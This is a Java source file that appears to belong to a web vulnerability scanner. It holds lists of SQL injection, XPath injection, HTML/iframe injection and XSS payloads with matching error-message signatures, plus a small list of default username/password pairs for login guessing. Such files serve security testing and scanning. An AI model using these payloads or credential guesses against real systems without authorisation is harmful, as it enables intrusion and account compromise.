/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Pay_Sig;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

/**
 *
 * @author laxba
 */
public class P_S {

    // Method to encode a string value using `UTF-8` encoding scheme
    public String encodeValue(String value) {
        try {
            return URLEncoder.encode(value, StandardCharsets.UTF_8.toString());
        } catch (UnsupportedEncodingException ex) {
            throw new RuntimeException(ex.getCause());
        }
    }

    public Map<String, ArrayList> SQLinjection() {
        ArrayList<String> listPay = new ArrayList<>();
        ArrayList<String> listSig = new ArrayList<>();
        Map<String, ArrayList> map = new HashMap<String, ArrayList>();
        ArrayList<String> temp = new ArrayList<>();

        /*List Signature SQL Injection*/
        listSig.add("You have an error in your SQL syntax");
        listSig.add("supplied argument is not a valid MySQL");
        listSig.add("mysql_fetch_array() expects parameter 1 to be resource, boolean given in");
        listSig.add("java.sql.SQLException: Syntax error or access violation");
        listSig.add("java.sql.SQLException: Unexpected end of command");
        listSig.add("PostgreSQL query failed: ERROR: parser:");
        listSig.add("XPathException");
        listSig.add("Warning: SimpleXMLElement::xpath():");
        listSig.add("[Microsoft][ODBC SQL Server Driver]");
        listSig.add("Microsoft OLE DB Provider for ODBC Drivers");
        listSig.add("[Microsoft][ODBC Microsoft Access Driver]");
        listSig.add("supplied argument is not a valid ldap");
        listSig.add("DB2 SQL error:");
        listSig.add("Interbase Injection");
        listSig.add("Sybase message:");
        listSig.add("Unclosed quotation mark after the character string");

        /*List Payload SQL Injection*/
        //SQL Injection
        listPay.add("a'");
        listPay.add("a' --");
        listPay.add("a' or 1=1; --");
        listPay.add("@");
        listPay.add("a@");
        listPay.add("?");
        listPay.add("' and 1=0) union all");
        listPay.add("%");
        listPay.add("%a");
        listPay.add("*");
        listPay.add("/");

        //Passive SQL Injection
        listPay.add("||6");
        listPay.add("'||(elt(-3+5,bin(15),ord(10),hex(char(45))))");
        listPay.add("'||'6");
        listPay.add("(||6)");
        listPay.add("\" or isNULL(1/0) /*");
        listPay.add("; or '1'='1'");

        /*
        Them payload vao duoi nay
         */
        //Them payload va signature vao hashmap
        for (String string : listPay) {
            map.put(string, listSig);
            map.put(this.encodeValue(string), listSig);
        }
        return map;
    }

    public Map<String, ArrayList> HTMLinjection() {
        ArrayList<String> listPay = new ArrayList<>();
        ArrayList<String> listSig = new ArrayList<>();
        Map<String, ArrayList> map = new HashMap<String, ArrayList>();
        ArrayList<String> temp = new ArrayList<>();

        /*List payload-signature html injection*/
        listSig.add("<h1>Test12345</h1>");

        /*
        Them payload vao duoi nay
         */
        //Them payload va signature vao hashmap
        for (String string : listSig) {
            temp = new ArrayList<>();
            temp.add(string);
            map.put(string, temp);
            map.put(this.encodeValue(string), temp);
            map.put(this.encodeValue(this.encodeValue(string)), temp);
        }
        return map;
    }

    public Map<String, ArrayList> XMLXPathInjection() {
        ArrayList<String> listPay = new ArrayList<>();
        ArrayList<String> listSig = new ArrayList<>();
        Map<String, ArrayList> map = new HashMap<String, ArrayList>();
        ArrayList<String> temp = new ArrayList<>();

        /*List signature XML XPath Injection*/
        listSig.add("SimpleXMLElement::xpath()");
        listSig.add("Invalid predicate in");
        listSig.add("xmlXPathEval: evaluation failed in");

        /*List payload XML XPath Injection*/
        listPay.add("'");
        listPay.add("' or '1'='1");
        listPay.add("' or ''='");
        listPay.add("x' or 1=1 or 'x'='y");
        listPay.add("/");
        listPay.add("//");
        listPay.add("//*");
        listPay.add("*/*");
        listPay.add("@*");
        listPay.add("count(/child::node())");
        listPay.add("x' or name()='username' or 'x'='y");
        listPay.add("' and count(/*)=1 and '1'='1");
        listPay.add("' and count(/@*)=1 and '1'='1");
        listPay.add("' and count(/comment())=1 and '1'='1");
        listPay.add("1][1");
        listPay.add("last()-1 and 1=2");
        listPay.add("Bible\" and lower-case('A') = \"a");
        listPay.add("')]password | a[contains(a,'");
        listPay.add("') or contains(genre, '");
        listPay.add("') or not(contains(genre, 'praveen') and '1'='2");

        //Them payload va signature vao hashmap
        for (String string : listPay) {
            map.put(string, listSig);
            map.put(this.encodeValue(string), listSig);
        }
        return map;
    }

    public Map<String, ArrayList> IFrameInjection() {
        ArrayList<String> listPay = new ArrayList<>();
        ArrayList<String> listSig = new ArrayList<>();
        Map<String, ArrayList> map = new HashMap<String, ArrayList>();
        ArrayList<String> temp = new ArrayList<>();

        /*List paylod-signature iFrame Injection*/
        listSig.add("\"><iframe><h1>Low</h1></iframe>");
        listSig.add("<iframe><h1>Test12345</h1></iframe>");

        //Them payload va signature vao hashmap
        for (String string : listSig) {
            temp = new ArrayList<>();
            temp.add(string);
            map.put(string, temp);
            map.put(this.encodeValue(string), temp);
            map.put(this.encodeValue(this.encodeValue(string)), temp);
        }
        return map;
    }

    public Map<String, ArrayList> XSS() {
        ArrayList<String> listPay = new ArrayList<>();
        ArrayList<String> listSig = new ArrayList<>();
        Map<String, ArrayList> map = new HashMap<String, ArrayList>();
        ArrayList<String> temp = new ArrayList<>();

        listSig.add("<script>alert(123);</script>");
        listSig.add("<marquee onstart='javascript:alert('1');'>=(◕_◕)=");
        listSig.add("\"><marquee onstart='javascript:alert('1');'>=(◕_◕)=");
        listSig.add("<script>alert(1);</script>");
        listSig.add("\"><script>alert(1);</script>");
        
//        listSig.add("xxx");
//        listSig.add("xxx");
//        listSig.add("xxx");
//        listSig.add("xxx");
//        listSig.add("xxx");
//        listSig.add("xxx");
//        listSig.add("xxx");
//        listSig.add("xxx");
//        listSig.add("xxx");
//        listSig.add("xxx");


        



        //Them payload va signature vao hashmap
        for (String string : listSig) {
            temp = new ArrayList<>();
            temp.add(string);
            map.put(string, temp);
            map.put(this.encodeValue(string), temp);
        }
        return map;
    }
    
    public Map<String, String> userPass(){
        Map<String, String> map = new HashMap<String, String>();
        map.put("admin", "password");
        map.put("laxbaortrung", "vangta0fa");
        map.put("bee", "bug");
        map.put("test", "test");


        return map;
    }

}
